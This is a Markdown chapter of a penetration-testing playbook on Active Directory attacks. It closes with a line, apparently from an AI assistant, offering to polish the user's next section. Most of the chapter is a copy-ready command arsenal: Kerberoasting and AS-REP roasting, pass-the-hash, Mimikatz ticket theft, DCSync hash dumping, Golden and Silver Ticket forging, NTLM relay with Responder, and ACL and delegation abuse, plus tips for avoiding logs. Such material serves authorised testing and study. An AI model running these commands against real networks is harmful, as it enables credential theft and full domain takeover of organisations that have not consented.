# 08 — Active Directory Attacks

## Philosophy

**Active Directory (AD)** is the identity backbone of most enterprise environments.
Compromising Active Directory often means gaining control of the **entire network**.

An attacker typically starts with:

* a compromised workstation
* a domain user credential
* local administrator access on a single host

The goal is to escalate privileges and ultimately obtain:

* **Domain Administrator**
* **Enterprise Administrator**
* **Domain Controller access**

Achieving domain dominance requires understanding:

* **Kerberos authentication**
* **LDAP directory structure**
* **Access control lists (ACLs)**
* **Group policies**
* **Trust relationships**

---

# Attack Surface Overview

Common Active Directory attack vectors:

| Surface                  | Description                                 |
| ------------------------ | ------------------------------------------- |
| Domain Users             | Account enumeration and privilege discovery |
| Service Accounts         | Accounts with Service Principal Names       |
| Kerberos                 | Ticket abuse and delegation attacks         |
| LDAP                     | Directory queries and ACL abuse             |
| SMB Shares               | SYSVOL, NETLOGON, file shares               |
| Group Policy Objects     | Misconfigured policies                      |
| Domain Trusts            | Cross-domain attack paths                   |
| Authentication Protocols | NTLM / Kerberos                             |
| Domain Controllers       | Primary objective for domain takeover       |

---

# Active Directory Attack Workflow

```
┌─────────────────────────────────────────────────────────┐
│                Initial Foothold                          │
│     Compromised workstation or valid domain creds       │
└─────────────────────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────┐
│              Domain Enumeration                          │
│   Users | Groups | Computers | SPNs | GPOs               │
└─────────────────────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────┐
│               Lateral Movement                           │
│   Pass-the-Hash | PS Remoting | WMI | SMB                │
└─────────────────────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────┐
│             Privilege Escalation                         │
│   Kerberoasting | ACL abuse | Delegation                 │
└─────────────────────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────┐
│                Domain Dominance                          │
│      DCSync | Golden Ticket | DC compromise              │
└─────────────────────────────────────────────────────────┘
```

---

# Command Arsenal

## Initial Domain Enumeration (PowerShell)

Basic domain reconnaissance:

```powershell
Get-ADDomain
Get-ADDomainController
```

Enumerate users:

```powershell
Get-ADUser -Filter * -Properties * |
Select SamAccountName,Description,LastLogonDate
```

Enumerate groups:

```powershell
Get-ADGroup -Filter * | Select Name,GroupCategory
```

List computers:

```powershell
Get-ADComputer -Filter * | Select Name,OperatingSystem
```

Find domain administrators:

```powershell
Get-ADGroupMember "Domain Admins"
```

---

## Enumeration Using Net Commands

```cmd
net user /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net accounts /domain
```

---

# BloodHound — Attack Path Analysis

One of the most powerful AD attack analysis tools is
BloodHound.

Data is collected using
SharpHound.

### Collect Data

```powershell
SharpHound.exe -c All
```

Transfer the resulting ZIP to the attacker machine and import it into BloodHound.

Typical queries:

* Shortest path to **Domain Admin**
* Users with **AdminTo privileges**
* Users with **GenericAll rights**
* Computers with **unconstrained delegation**

---

# Domain Enumeration with CrackMapExec

Using
CrackMapExec.

Enumerate users:

```bash
crackmapexec smb 192.168.1.10 -u user -p pass --users
```

Enumerate groups:

```bash
crackmapexec smb 192.168.1.10 -u user -p pass --groups
```

Enumerate shares:

```bash
crackmapexec smb 192.168.1.10 -u user -p pass --shares
```

Check password policy:

```bash
crackmapexec smb 192.168.1.10 -u user -p pass --pass-pol
```

Check active sessions:

```bash
crackmapexec smb 192.168.1.10 -u user -p pass --sessions
```

Detect SMB relay targets:

```bash
crackmapexec smb 192.168.1.10 -u '' -p '' --gen-relay-list targets.txt
```

---

# Kerberoasting

Kerberoasting targets **service accounts with SPNs**.

Using
Impacket.

Extract SPN tickets:

```bash
impacket-GetUserSPNs -request -dc-ip 192.168.1.10 domain.local/user:password
```

Crack with hashcat:

```bash
hashcat -m 13100 spn.hash rockyou.txt
```

---

# AS-REP Roasting

Targets users **without Kerberos preauthentication**.

```bash
impacket-GetNPUsers -dc-ip 192.168.1.10 \
domain.local/ \
-usersfile users.txt \
-format hashcat
```

Crack using:

```
hashcat -m 18200
```

---

# Pass-the-Hash

Authenticate using NTLM hashes.

```bash
impacket-psexec -hashes :NTLMHASH administrator@192.168.1.10
```

---

# Overpass-the-Hash

Generate Kerberos tickets using NTLM hash.

```bash
impacket-getTGT -hashes :NTLMHASH domain.local/administrator
```

Use ticket:

```bash
export KRB5CCNAME=administrator.ccache
impacket-psexec domain.local/administrator@target -k -no-pass
```

---

# Pass-the-Ticket

Extract tickets using
Mimikatz.

```
sekurlsa::tickets /export
```

Load ticket:

```
kerberos::ptt ticket.kirbi
```

---

# DCSync Attack

DCSync extracts password hashes from the domain controller.

Using Impacket:

```bash
impacket-secretsdump -just-dc domain.local/administrator@192.168.1.10
```

Using Mimikatz:

```
lsadump::dcsync /domain:domain.local /all /csv
```

---

# Golden Ticket Attack

After obtaining the **krbtgt hash**, generate a persistent Kerberos ticket.

```bash
impacket-ticketer \
-nthash krbtgt_hash \
-domain-sid S-1-5-21-XXXX \
-domain domain.local \
Administrator
```

Use the ticket:

```bash
export KRB5CCNAME=Administrator.ccache
impacket-psexec domain.local/Administrator@dc -k -no-pass
```

---

# Silver Ticket Attack

Forged ticket for specific service.

```bash
impacket-ticketer \
-nthash service_hash \
-domain-sid S-1-5-21-XXXX \
-domain domain.local \
-spn cifs/target.domain.local \
Administrator
```

---

# SMB Relay

Capture NTLM authentication and relay it.

Start responder:

```bash
responder -I eth0 -rdwv
```

Relay credentials:

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
```

---

# Deep Enumeration

## ACL Abuse

Identify dangerous ACL permissions.

```powershell
Get-ObjectAcl -ResolveGUIDs |
? {$_.ActiveDirectoryRights -match "GenericAll|WriteOwner|WriteProperty"}
```

Reset password if GenericAll:

```cmd
net user targetuser NewPassword /domain
```

---

## Unconstrained Delegation

Find vulnerable computers:

```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $true}
```

Attack chain:

```
Compromise host → wait for admin login → steal TGT
```

---

## Constrained Delegation

Find delegation accounts:

```powershell
Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne $null}
```

Request service ticket:

```bash
impacket-getST \
-spn cifs/target.domain.local \
-impersonate administrator \
domain.local/user:password
```

---

# Group Policy Enumeration

List GPOs:

```powershell
Get-GPO -All
```

Generate report:

```powershell
Get-GPOReport -Name "Default Domain Policy" -ReportType XML
```

Check SYSVOL:

```bash
ls \\domain.local\SYSVOL\domain.local\Policies
```

---

# Common AD Attack Chains

### Example 1

```
Low-priv user
→ Kerberoast service account
→ Crack password
→ Privileged group access
```

### Example 2

```
Workstation compromise
→ Unconstrained delegation host
→ Capture admin TGT
→ Domain Admin
```

### Example 3

```
Password spray
→ Compromise admin account
→ DCSync
→ Full domain compromise
```

---

# Common Mistakes

### Not Using BloodHound

It reveals complex attack paths quickly.

### Ignoring Computer Accounts

Computer accounts may have delegated privileges.

### Overlooking SMB Signing

If disabled → NTLM relay possible.

### Missing AS-REP Roasting

Legacy accounts often disable Kerberos preauth.

---

# Professional Tips

### Use `secretsdump -just-dc`

This avoids unnecessary noise.

### Run SharpHound from multiple hosts

More data reveals more attack paths.

### Roast from non-DC machines

Avoid generating logs on domain controllers.

### Dump local SAM hashes

```
crackmapexec smb target --sam
```

---

# Output Organization

```
08-Active-Directory/

├── README.md
│
├── bloodhound
│   ├── ingest
│   └── analysis
│
├── hashes
│   ├── krbtgt.hash
│   ├── dcsync_output.txt
│   └── kerberoast_hashes.txt
│
├── targets
│   ├── domain_users.txt
│   ├── domain_admins.txt
│   ├── spn_accounts.txt
│   └── computers.txt
│
└── attack_paths.txt
```

If you want, I can also **polish the next section (09 — Pivoting & Tunneling)** so your repo becomes a **complete elite pentester playbook** similar to what top **Offensive Security** candidates publish after passing **OSCP.
